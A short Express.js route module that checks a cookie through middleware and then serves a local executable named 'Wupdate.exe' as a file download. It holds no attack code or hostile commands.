const router = require('express').Router();
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const express = require("express");
const path = require("path");
const fs = require("fs");
const appDir = path.dirname(require.main.filename);

router.use(toolCookieValidator);

router.route('/').get((req, res) => {
    res.setHeader('Content-disposition', 'attachment; filename=Wupdate.exe');
    res.setHeader('Content-type', 'application/x-msdownload');
    let file = fs.createReadStream(`${appDir}\\tool\\Wupdate.exe`);
    file.pipe(res)
})
module.exports = router;